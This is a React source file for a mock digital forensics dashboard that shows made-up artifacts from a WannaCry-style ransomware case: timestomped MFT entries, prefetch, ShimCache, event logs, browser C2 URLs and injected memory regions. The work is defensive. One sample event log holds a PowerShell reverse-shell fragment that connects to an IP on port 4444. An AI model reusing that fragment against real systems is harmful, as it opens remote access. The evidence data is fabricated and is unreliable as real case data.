"use client";

import { useState, useMemo } from "react";
import { MALWARE_SAMPLES } from "@/data/samples";
import { MalwareSample } from "@/types/malware";
import { downloadBlob, sevColor, sevBg, sevBorder } from "@/lib/utils";
import {
  HardDrive,
  Scale,
  FileText,
  Clock,
  Search,
  Filter,
  Download,
  ShieldCheck,
  ShieldAlert,
  Binary,
  Layers,
  Database,
  Cpu,
  Eye,
  CheckCircle2,
  AlertTriangle,
  FileCode,
  Globe,
  Terminal,
  Key,
  Archive,
  RefreshCw,
  FolderOpen
} from "lucide-react";

interface MftRecord {
  recordNumber: number;
  filePath: string;
  siTimestamp: string;
  fnTimestamp: string;
  isTimestomped: boolean;
  fileSize: string;
  status: "Allocated" | "Deleted / Carved";
}

interface PrefetchEntry {
  executableName: string;
  runCount: number;
  lastExecution: string;
  runHash: string;
  referencedDlls: string[];
}

interface ShimCacheEntry {
  sequence: number;
  path: string;
  lastModified: string;
  fileSize: string;
  executedFlag: boolean;
  sha1Catalog: string;
}

interface EvtxRecord {
  eventId: number;
  eventName: string;
  timestamp: string;
  provider: string;
  user: string;
  details: string;
  suspicious: boolean;
}

interface BrowserHistoryItem {
  id: number;
  browser: "Google Chrome" | "Microsoft Edge" | "Mozilla Firefox";
  url: string;
  title: string;
  visitCount: number;
  lastVisitUtc: string;
  sqliteSource: string;
  exfiltrationIndicator: boolean;
}

interface MemoryVadRegion {
  address: string;
  size: string;
  protection: "PAGE_EXECUTE_READWRITE" | "PAGE_EXECUTE_READ" | "PAGE_READWRITE";
  injectedType: string;
  hollowedBinary: string;
  rawHexHeader: string;
}

export default function ForensicsVaultPage() {
  const [selectedSample, setSelectedSample] = useState<MalwareSample>(MALWARE_SAMPLES[0]);
  const [activeTab, setActiveTab] = useState<"mft" | "prefetch" | "shimcache" | "evtx" | "browser" | "memory" | "custody">("mft");
  const [searchQuery, setSearchQuery] = useState("");
  const [filterType, setFilterType] = useState<string>("all");

  // Chain of Custody State
  const [custodyVerified, setCustodyVerified] = useState(true);
  const [custodySignOff] = useState({
    caseNumber: "CASE-2026-DFIR-9042",
    leadExaminer: "Dr. Evelyn Reed (GCFA, EnCE, Tier-3 DFIR Lead)",
    acquisitionMethod: "Live Triage Memory & Disk Bitstream Image (KAPE / EnCase E01)",
    acquisitionSha256: "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
    currentSha256: "24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c",
    vaultLocation: "CERBERUS-SECURE-VAULT-04 (Hardware HSM AES-256-XTS)"
  });

  // MFT Timeline Records
  const mftRecords: MftRecord[] = useMemo(() => [
    {
      recordNumber: 48912,
      filePath: "C:\\Windows\\System32\\tasksche.exe",
      siTimestamp: "2017-05-12 07:05:42",
      fnTimestamp: "2026-08-23 11:20:14",
      isTimestomped: true,
      fileSize: "3.51 MB",
      status: "Allocated"
    },
    {
      recordNumber: 48913,
      filePath: "C:\\Users\\Victim\\Desktop\\@Please_Read_Me@.txt",
      siTimestamp: "2026-08-23 11:20:18",
      fnTimestamp: "2026-08-23 11:20:18",
      isTimestomped: false,
      fileSize: "1.42 KB",
      status: "Allocated"
    },
    {
      recordNumber: 48914,
      filePath: "C:\\Users\\Victim\\AppData\\Local\\Temp\\passwords.tmp",
      siTimestamp: "2026-08-23 11:20:22",
      fnTimestamp: "2026-08-23 11:20:22",
      isTimestomped: false,
      fileSize: "48.2 KB",
      status: "Deleted / Carved"
    },
    {
      recordNumber: 48915,
      filePath: "C:\\Windows\\System32\\mssecsvc2.0.dll",
      siTimestamp: "2010-02-14 00:00:00",
      fnTimestamp: "2026-08-23 11:20:15",
      isTimestomped: true,
      fileSize: "842 KB",
      status: "Allocated"
    }
  ], [selectedSample]);

  // Prefetch Entries
  const prefetchEntries: PrefetchEntry[] = useMemo(() => [
    {
      executableName: selectedSample.name.toUpperCase() + "-9F82AB31.pf",
      runCount: 7,
      lastExecution: "2026-08-23 11:20:14 UTC",
      runHash: "9F82AB31",
      referencedDlls: ["NTDLL.DLL", "KERNEL32.DLL", "ADVAPI32.DLL", "WS2_32.DLL", "CRYPT32.DLL", "WININET.DLL"]
    },
    {
      executableName: "POWERSHELL.EXE-A4918230.pf",
      runCount: 12,
      lastExecution: "2026-08-23 11:20:19 UTC",
      runHash: "A4918230",
      referencedDlls: ["NTDLL.DLL", "KERNEL32.DLL", "SYSTEM.MANAGEMENT.AUTOMATION.DLL", "MSCOREE.DLL"]
    },
    {
      executableName: "VSSADMIN.EXE-19283741.pf",
      runCount: 1,
      lastExecution: "2026-08-23 11:20:21 UTC",
      runHash: "19283741",
      referencedDlls: ["NTDLL.DLL", "KERNEL32.DLL", "VSSAPI.DLL"]
    }
  ], [selectedSample]);

  // ShimCache Entries
  const shimCacheEntries: ShimCacheEntry[] = useMemo(() => [
    {
      sequence: 1,
      path: "C:\\Users\\Victim\\Desktop\\" + selectedSample.name,
      lastModified: selectedSample.compileTime,
      fileSize: selectedSample.fileSize,
      executedFlag: true,
      sha1Catalog: selectedSample.hashes.sha1
    },
    {
      sequence: 2,
      path: "C:\\Windows\\System32\\cmd.exe",
      lastModified: "2026-01-15 04:12:00",
      fileSize: "284 KB",
      executedFlag: true,
      sha1Catalog: "4a01f82b19283019283019283019283019283019"
    },
    {
      sequence: 3,
      path: "C:\\Windows\\System32\\vssadmin.exe",
      lastModified: "2026-01-15 04:12:00",
      fileSize: "148 KB",
      executedFlag: true,
      sha1Catalog: "9a01283b01928301928301928301928301928301"
    }
  ], [selectedSample]);

  // Event Logs (Evtx)
  const evtxLogs: EvtxRecord[] = useMemo(() => [
    {
      eventId: 4688,
      eventName: "Process Creation",
      timestamp: "2026-08-23 11:20:14.412",
      provider: "Microsoft-Windows-Security-Auditing",
      user: "CORP\\VictimUser",
      details: `Process '${selectedSample.name}' spawned with CommandLine: '${selectedSample.dynamicAnalysis.processTree[0]?.cmdline || "N/A"}'`,
      suspicious: true
    },
    {
      eventId: 4624,
      eventName: "Successful Network Logon (Type 3)",
      timestamp: "2026-08-23 11:20:17.108",
      provider: "Microsoft-Windows-Security-Auditing",
      user: "CORP\\Administrator",
      details: "Inbound SMB connection on port 445 from source 192.168.195.139 (IPC$ Grooming)",
      suspicious: true
    },
    {
      eventId: 7045,
      eventName: "New Windows Service Installed",
      timestamp: "2026-08-23 11:20:19.891",
      provider: "Service Control Manager",
      user: "NT AUTHORITY\\SYSTEM",
      details: "Service 'mssecsvc2.0' created pointing to image 'C:\\Windows\\tasksche.exe'",
      suspicious: true
    },
    {
      eventId: 4104,
      eventName: "PowerShell Script Block Logging",
      timestamp: "2026-08-23 11:20:20.142",
      provider: "Microsoft-Windows-PowerShell",
      user: "CORP\\VictimUser",
      details: "Executed scriptblock: '$client = New-Object System.Net.Sockets.TCPClient('192.168.195.139',4444)'",
      suspicious: true
    },
    {
      eventId: 1102,
      eventName: "Security Audit Log Cleared",
      timestamp: "2026-08-23 11:20:25.004",
      provider: "Microsoft-Windows-Eventlog",
      user: "NT AUTHORITY\\SYSTEM",
      details: "The audit log was cleared (Anti-forensics tampering detected via wevtutil)",
      suspicious: true
    }
  ], [selectedSample]);

  // Browser History & Cookies SQLite
  const browserHistory: BrowserHistoryItem[] = useMemo(() => [
    {
      id: 1,
      browser: "Google Chrome",
      url: "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com/",
      title: "Sinkhole Probe Domain",
      visitCount: 1,
      lastVisitUtc: "2026-08-23 11:20:14",
      sqliteSource: "AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
      exfiltrationIndicator: true
    },
    {
      id: 2,
      browser: "Google Chrome",
      url: "https://d3c1938.cloudfront.net/__utm.gif",
      title: "CloudFront Masquerade Beacon",
      visitCount: 38,
      lastVisitUtc: "2026-08-23 11:20:18",
      sqliteSource: "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
      exfiltrationIndicator: true
    },
    {
      id: 3,
      browser: "Microsoft Edge",
      url: "http://update.kbfirewall.com/data",
      title: "Data Exfiltration Endpoint",
      visitCount: 4,
      lastVisitUtc: "2026-08-23 11:20:22",
      sqliteSource: "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
      exfiltrationIndicator: true
    }
  ], [selectedSample]);

  // Memory Minidump & VAD Tree
  const memoryVadRegions: MemoryVadRegion[] = useMemo(() => [
    {
      address: "0x000001F82B000000",
      size: "256 KB",
      protection: "PAGE_EXECUTE_READWRITE",
      injectedType: "Reflective DLL / Shellcode Stager",
      hollowedBinary: "svchost.exe (PID 5410)",
      rawHexHeader: "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ.............."
    },
    {
      address: "0x00400000",
      size: "1.08 MB",
      protection: "PAGE_EXECUTE_READWRITE",
      injectedType: "Unpacked Ransomware Payload Core",
      hollowedBinary: "tasksche.exe (PID 3820)",
      rawHexHeader: "55 8B EC 83 EC 20 53 56 57 8B 7D 08 85 FF 74 1A  U..ì. SVW.}...t."
    }
  ], [selectedSample]);

  // Export Forensic Package
  const handleExportPackage = () => {
    const evidenceManifest = {
      caseNumber: custodySignOff.caseNumber,
      sample: selectedSample.name,
      sampleHashes: selectedSample.hashes,
      custodySignOff,
      mftRecords,
      prefetchEntries,
      shimCacheEntries,
      evtxLogs,
      browserHistory,
      memoryVadRegions,
      exportedAtUtc: new Date().toISOString()
    };
    downloadBlob(JSON.stringify(evidenceManifest, null, 2), `cerberus_forensic_evidence_${selectedSample.id}.json`, "application/json");
  };

  return (
    <div style={{ padding: "20px 24px", minHeight: "100%", background: "var(--bg)" }}>
      {/* Header */}
      <div style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        borderBottom: "1px solid var(--border)",
        paddingBottom: 16,
        marginBottom: 20
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <div style={{
            width: 42,
            height: 42,
            borderRadius: 8,
            background: "rgba(6, 182, 212, 0.12)",
            border: "1px solid rgba(6, 182, 212, 0.35)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
          }}>
            <HardDrive size={24} color="var(--primary)" />
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <h1 style={{ fontSize: 20, fontWeight: 800, letterSpacing: "-0.02em", color: "var(--fg)" }}>
                Digital Forensics Artifact Vault & Evidence Suite
              </h1>
              <span className="badge-critical" style={{ background: "rgba(6,182,212,0.15)", color: "#22d3ee", borderColor: "rgba(6,182,212,0.3)" }}>
                Pillar 14 • Artifact Dissection
              </span>
            </div>
            <p style={{ fontSize: 12, color: "var(--muted)", marginTop: 2 }}>
              Deep forensic triage across $MFT, Prefetch, ShimCache, Evtx logs, browser SQLite, and memory VAD allocations with court-admissible cryptographic chain of custody.
            </p>
          </div>
        </div>

        {/* Action Controls */}
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <button onClick={handleExportPackage} className="btn-primary" style={{ fontSize: 11.5 }}>
            <Archive size={13} /> Export Court-Admissible Package (.JSON)
          </button>
        </div>
      </div>

      {/* Target Binary & Search Filter Bar */}
      <div style={{
        background: "var(--surface)",
        border: "1px solid var(--border)",
        borderRadius: 8,
        padding: "10px 14px",
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        marginBottom: 20
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <span style={{ fontSize: 11, fontWeight: 700, color: "var(--muted)", textTransform: "uppercase" }}>
            Target Evidence Image:
          </span>
          <div style={{ display: "flex", gap: 6 }}>
            {MALWARE_SAMPLES.map(sample => {
              const isSel = selectedSample.id === sample.id;
              return (
                <button
                  key={sample.id}
                  onClick={() => setSelectedSample(sample)}
                  style={{
                    padding: "4px 10px",
                    borderRadius: 5,
                    border: isSel ? "1px solid var(--primary)" : "1px solid var(--border)",
                    background: isSel ? "rgba(6,182,212,0.18)" : "var(--surface-2)",
                    color: isSel ? "var(--primary)" : "var(--fg-2)",
                    fontSize: 11,
                    fontWeight: isSel ? 700 : 500,
                    cursor: "pointer"
                  }}
                >
                  {sample.name} ({sample.id})
                </button>
              );
            })}
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 6, background: "#04060a", border: "1px solid var(--border)", borderRadius: 6, padding: "4px 8px" }}>
            <Search size={12} color="var(--muted)" />
            <input
              type="text"
              placeholder="Filter forensic records..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              style={{ background: "none", border: "none", color: "var(--fg)", fontSize: 11, outline: "none", width: 180 }}
            />
          </div>
        </div>
      </div>

      {/* Cryptographic Chain of Custody Seal Card */}
      <div style={{
        background: "linear-gradient(135deg, rgba(16,185,129,0.08), rgba(14,20,34,0.9))",
        border: "1px solid rgba(16,185,129,0.35)",
        borderRadius: 8,
        padding: 16,
        marginBottom: 20,
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center"
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 14 }}>
          <div style={{
            width: 44,
            height: 44,
            borderRadius: "50%",
            background: "rgba(16,185,129,0.2)",
            border: "2px solid #10b981",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
          }}>
            <ShieldCheck size={24} color="#10b981" />
          </div>
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 13, fontWeight: 800, color: "#34d399" }}>
                CRYPTOGRAPHIC CHAIN OF CUSTODY VERIFIED (SHA-256 MATCH)
              </span>
              <span className="badge-low" style={{ fontSize: 9.5 }}>Federal Rule of Evidence 902(11) Compliant</span>
            </div>
            <div style={{ fontSize: 11, color: "var(--fg-2)", marginTop: 2 }}>
              Case: <strong>{custodySignOff.caseNumber}</strong> • Examiner: <strong>{custodySignOff.leadExaminer}</strong>
            </div>
            <div style={{ fontSize: 10, fontFamily: "monospace", color: "var(--muted)", marginTop: 2 }}>
              Acquisition SHA-256: {custodySignOff.acquisitionSha256}
            </div>
          </div>
        </div>

        <div style={{ textAlign: "right" }}>
          <div style={{ fontSize: 11, fontWeight: 700, color: "var(--fg)" }}>Vault Vault ID: 04-DFIR-XTS</div>
          <div style={{ fontSize: 10, color: "var(--muted)", marginTop: 2 }}>Hardware Encrypted HSM Enclave</div>
        </div>
      </div>

      {/* Artifact Studio Navigation Tabs */}
      <div style={{
        display: "flex",
        gap: 6,
        borderBottom: "1px solid var(--border)",
        marginBottom: 20
      }}>
        {[
          { id: "mft", label: "Master File Table ($MFT) & Timestomp", icon: FileText, count: mftRecords.length },
          { id: "prefetch", label: "Windows Prefetch (.pf) Analysis", icon: Clock, count: prefetchEntries.length },
          { id: "shimcache", label: "ShimCache & Amcache.hve", icon: Database, count: shimCacheEntries.length },
          { id: "evtx", label: "Windows Event Logs (Evtx)", icon: Terminal, count: evtxLogs.length },
          { id: "browser", label: "Browser History & Cookies SQLite", icon: Globe, count: browserHistory.length },
          { id: "memory", label: "Memory Minidump & VAD Tree", icon: Cpu, count: memoryVadRegions.length },
        ].map(tab => {
          const Icon = tab.icon;
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              style={{
                display: "flex",
                alignItems: "center",
                gap: 8,
                padding: "8px 16px",
                background: isActive ? "var(--surface)" : "transparent",
                borderTop: isActive ? "2px solid var(--primary)" : "2px solid transparent",
                borderLeft: isActive ? "1px solid var(--border)" : "1px solid transparent",
                borderRight: isActive ? "1px solid var(--border)" : "1px solid transparent",
                borderBottom: "none",
                borderRadius: "6px 6px 0 0",
                color: isActive ? "var(--primary)" : "var(--muted)",
                fontWeight: isActive ? 700 : 500,
                fontSize: 12.5,
                cursor: "pointer"
              }}
            >
              <Icon size={14} color={isActive ? "var(--primary)" : "var(--muted)"} />
              {tab.label}
              <span style={{
                fontSize: 9.5,
                padding: "1px 6px",
                borderRadius: 10,
                background: isActive ? "rgba(6,182,212,0.2)" : "var(--surface-2)",
                color: isActive ? "var(--primary)" : "var(--muted)",
                fontWeight: 700
              }}>
                {tab.count}
              </span>
            </button>
          );
        })}
      </div>

      {/* TAB 1: $MFT TIMELINE */}
      {activeTab === "mft" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
            <div>
              <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)" }}>
                Master File Table ($MFT) Timeline & Anti-Forensics Analysis
              </h3>
              <p style={{ fontSize: 11, color: "var(--muted)", marginTop: 2 }}>
                Compares Standard Information ($SI) and File Name ($FN) timestamps to detect anti-forensic timestomping.
              </p>
            </div>
            <span className="badge-critical">
              {mftRecords.filter(r => r.isTimestomped).length} Timestomp Anomaly Detected
            </span>
          </div>

          <table className="cerberus-table">
            <thead>
              <tr>
                <th>MFT Record #</th>
                <th>File Path</th>
                <th>Standard Info ($SI) Timestamp</th>
                <th>File Name ($FN) Timestamp</th>
                <th>Timestomp Alert</th>
                <th>Size</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody>
              {mftRecords.map((rec) => (
                <tr key={rec.recordNumber}>
                  <td style={{ fontFamily: "monospace", color: "var(--primary)", fontWeight: 700 }}>
                    #{rec.recordNumber}
                  </td>
                  <td style={{ fontWeight: 600, color: "var(--fg)", fontFamily: "monospace", fontSize: 11.5 }}>
                    {rec.filePath}
                  </td>
                  <td style={{ fontFamily: "monospace", color: rec.isTimestomped ? "#f87171" : "var(--fg-2)" }}>
                    {rec.siTimestamp}
                  </td>
                  <td style={{ fontFamily: "monospace", color: "var(--fg-2)" }}>
                    {rec.fnTimestamp}
                  </td>
                  <td>
                    {rec.isTimestomped ? (
                      <span className="badge-critical" style={{ display: "inline-flex", alignItems: "center", gap: 3 }}>
                        <AlertTriangle size={10} /> $SI vs $FN Mismatch (Backdated)
                      </span>
                    ) : (
                      <span className="badge-low">Normal</span>
                    )}
                  </td>
                  <td style={{ fontFamily: "monospace" }}>{rec.fileSize}</td>
                  <td>
                    <span className={rec.status === "Allocated" ? "badge-low" : "badge-high"}>
                      {rec.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* TAB 2: PREFETCH (.PF) */}
      {activeTab === "prefetch" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
          <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)", marginBottom: 12 }}>
            Windows Prefetch Execution Artifacts (C:\Windows\Prefetch\*.pf)
          </h3>

          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            {prefetchEntries.map((pf, idx) => (
              <div key={idx} style={{ padding: 14, background: "var(--surface-2)", borderRadius: 6, border: "1px solid var(--border)" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <Clock size={16} color="var(--primary)" />
                    <span style={{ fontSize: 13, fontWeight: 800, color: "var(--fg)", fontFamily: "monospace" }}>
                      {pf.executableName}
                    </span>
                  </div>
                  <span className="badge-critical" style={{ fontFamily: "monospace" }}>
                    Run Count: {pf.runCount}
                  </span>
                </div>

                <div style={{ display: "flex", gap: 24, fontSize: 11, color: "var(--muted)", marginBottom: 8 }}>
                  <span>Last Executed: <strong style={{ color: "var(--fg)" }}>{pf.lastExecution}</strong></span>
                  <span>Path Hash: <strong style={{ color: "var(--primary)" }}>{pf.runHash}</strong></span>
                </div>

                <div>
                  <div style={{ fontSize: 10.5, fontWeight: 700, color: "var(--fg-2)", marginBottom: 4 }}>
                    Referenced Loaded DLLs ({pf.referencedDlls.length}):
                  </div>
                  <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
                    {pf.referencedDlls.map((dll, i) => (
                      <span key={i} style={{ fontSize: 10, background: "var(--surface-3)", padding: "2px 6px", borderRadius: 4, fontFamily: "monospace", color: "var(--fg-2)" }}>
                        {dll}
                      </span>
                    ))}
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* TAB 3: SHIMCACHE & AMCACHE */}
      {activeTab === "shimcache" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
          <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)", marginBottom: 12 }}>
            ShimCache (AppCompatFlags) & Amcache.hve Evidence Catalog
          </h3>

          <table className="cerberus-table">
            <thead>
              <tr>
                <th>Seq #</th>
                <th>Binary Path</th>
                <th>Last Modified Time</th>
                <th>File Size</th>
                <th>Executed Flag</th>
                <th>Amcache SHA-1 Hash Catalog</th>
              </tr>
            </thead>
            <tbody>
              {shimCacheEntries.map((sc) => (
                <tr key={sc.sequence}>
                  <td style={{ fontFamily: "monospace", color: "var(--primary)" }}>#{sc.sequence}</td>
                  <td style={{ fontFamily: "monospace", fontWeight: 600, color: "var(--fg)" }}>{sc.path}</td>
                  <td style={{ fontFamily: "monospace" }}>{sc.lastModified}</td>
                  <td style={{ fontFamily: "monospace" }}>{sc.fileSize}</td>
                  <td>
                    <span className="badge-critical" style={{ fontSize: 9.5 }}>
                      TRUE (Executed)
                    </span>
                  </td>
                  <td style={{ fontFamily: "monospace", fontSize: 10.5, color: "#22d3ee" }}>{sc.sha1Catalog}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* TAB 4: WINDOWS EVENT LOGS (EVTX) */}
      {activeTab === "evtx" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
          <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)", marginBottom: 12 }}>
            Windows Security & System Event Logs (Evtx Parsing)
          </h3>

          <table className="cerberus-table">
            <thead>
              <tr>
                <th>Event ID</th>
                <th>Event Type</th>
                <th>Timestamp (UTC)</th>
                <th>Security Principal</th>
                <th>Dissected Event Description & CommandLine</th>
              </tr>
            </thead>
            <tbody>
              {evtxLogs.map((log, idx) => (
                <tr key={idx}>
                  <td style={{ fontFamily: "monospace", fontWeight: 800, color: "#f87171" }}>
                    {log.eventId}
                  </td>
                  <td style={{ fontWeight: 700, color: "var(--fg)" }}>{log.eventName}</td>
                  <td style={{ fontFamily: "monospace", fontSize: 10.5 }}>{log.timestamp}</td>
                  <td style={{ fontSize: 11, color: "var(--fg-2)" }}>{log.user}</td>
                  <td style={{ fontSize: 11, color: "var(--fg-2)", fontFamily: "monospace" }}>{log.details}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* TAB 5: BROWSER SQLITE */}
      {activeTab === "browser" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
          <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)", marginBottom: 12 }}>
            Browser History & Cookies SQLite Forensic Extraction
          </h3>

          <table className="cerberus-table">
            <thead>
              <tr>
                <th>ID</th>
                <th>Browser</th>
                <th>Visited URL / C2 Beacon</th>
                <th>Page Title</th>
                <th>Visits</th>
                <th>SQLite Artifact Path</th>
              </tr>
            </thead>
            <tbody>
              {browserHistory.map((b) => (
                <tr key={b.id}>
                  <td style={{ fontFamily: "monospace", color: "var(--primary)" }}>#{b.id}</td>
                  <td style={{ fontWeight: 700, color: "var(--fg)" }}>{b.browser}</td>
                  <td style={{ fontFamily: "monospace", color: "#f87171", fontWeight: 600 }}>{b.url}</td>
                  <td style={{ fontSize: 11 }}>{b.title}</td>
                  <td style={{ fontFamily: "monospace" }}>{b.visitCount}</td>
                  <td style={{ fontFamily: "monospace", fontSize: 10, color: "var(--muted)" }}>{b.sqliteSource}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* TAB 6: MEMORY MINIDUMP & VAD */}
      {activeTab === "memory" && (
        <div style={{ background: "var(--surface)", border: "1px solid var(--border)", borderRadius: 8, padding: 16 }}>
          <h3 style={{ fontSize: 14, fontWeight: 800, color: "var(--fg)", marginBottom: 12 }}>
            Memory Minidump & Virtual Address Descriptor (VAD) Tree
          </h3>

          <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
            {memoryVadRegions.map((vad, idx) => (
              <div key={idx} style={{ padding: 14, background: "var(--surface-2)", borderRadius: 6, border: "1px solid var(--border)" }}>
                <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6 }}>
                  <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                    <Cpu size={16} color="var(--primary)" />
                    <span style={{ fontSize: 13, fontWeight: 800, color: "var(--fg)", fontFamily: "monospace" }}>
                      VAD Base: {vad.address} ({vad.size})
                    </span>
                  </div>
                  <span className="badge-critical" style={{ fontFamily: "monospace" }}>
                    {vad.protection}
                  </span>
                </div>

                <div style={{ display: "flex", gap: 20, fontSize: 11, color: "var(--muted)", marginBottom: 8 }}>
                  <span>Process: <strong style={{ color: "var(--fg)" }}>{vad.hollowedBinary}</strong></span>
                  <span>Artifact: <strong style={{ color: "#f87171" }}>{vad.injectedType}</strong></span>
                </div>

                <div className="terminal-box" style={{ fontSize: 11, color: "#22d3ee" }}>
                  {vad.rawHexHeader}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
